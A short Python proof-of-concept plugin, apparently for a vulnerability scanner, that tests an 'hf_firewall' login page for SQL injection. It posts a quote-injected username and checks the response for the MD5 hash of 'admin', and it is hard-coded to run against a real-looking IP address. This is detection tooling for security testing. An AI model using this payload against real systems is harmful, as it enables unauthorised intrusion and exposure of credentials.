#!/usr/bin/env python
#-*- coding: utf-8 -*-
#ref:http://www.wooyun.org/bugs/wooyun-2010-0114593
import time

import urlparse
def assign(service, arg):
    if service == "hf_firewall":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    poc = arg+'login.php'
    postdata="action=login&username=admin'&password=admin&submit=%E7%99%BB %E5%BD%95"
    code, head, res, errcode, _ = curl.curl2(poc,post=postdata)
    if code==200 and '21232f297a57a5a743894a0e4a801fc3' in res:
        security_hole(poc+", can be sqli ,ref:http://www.wooyun.org/bugs/wooyun-2010-0114593")

if __name__ == '__main__':
    from dummy import *
    audit(assign("hf_firewall", 'http://202.70.26.137:8080/')[1])